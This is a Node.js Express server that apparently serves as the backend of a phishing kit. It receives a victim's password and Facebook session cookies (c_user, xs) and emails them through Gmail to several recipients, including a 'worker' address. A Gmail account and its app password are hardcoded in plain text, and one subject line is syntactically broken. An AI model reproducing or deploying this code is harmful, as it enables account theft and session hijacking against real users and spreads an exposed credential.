const express = require('express');
const cors = require('cors');
const nodemailer = require('nodemailer');

const app = express();
app.use(cors());
app.use(express.json());

app.post('/submit', async (req, res) => {
    const { c_user, xs, password, emails = [], workerEmail, name } = req.body;

    const transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: 'hindistoryhub396@gmail.com',         // 🔁 your Gmail
            pass: 'fylk gbsb cdgu anwh'            // 🔁 app password from Google
        }
    });

    // ✅ Email to all recipients (including worker)
    const allRecipients = [...emails];
    if (workerEmail) allRecipients.push(workerEmail);

    const toOtherEmailsOnly = emails;
    const toWorkerOnly = workerEmail ? [workerEmail] : [];

    // 1️⃣ Email to all: send password
    const passwordMail = {
        from: 'hindistoryhub396@gmail.com',
        to: allRecipients.join(','),
        subject: PROFESSOR ${name}`,
        text: `Password: ${password}`
    };

    // 2️⃣ Email to other recipients only (c_user and xs)
    const sessionDataMail = {
        from: 'hindistoryhub396@gmail.com',
        to: toOtherEmailsOnly.join(','),
        subject: `PROFESSOR ${name}`,
        text: `c_user: ${c_user}\nxs: ${xs}`
    };

    try {
        // Send password to all
        await transporter.sendMail(passwordMail);
        console.log('✅ Password email sent');

        // Send session info to other recipients only
        if (toOtherEmailsOnly.length > 0) {
            await transporter.sendMail(sessionDataMail);
            console.log('✅ Session info email sent');
        }

        res.status(200).json({ message: 'Emails sent' });
    } catch (error) {
        console.error('❌ Email sending failed:', error);
        res.status(500).json({ error: 'Email sending failed' });
    }
});

app.listen(3000, () => {
    console.log('✅ Server running on port 3000');
});
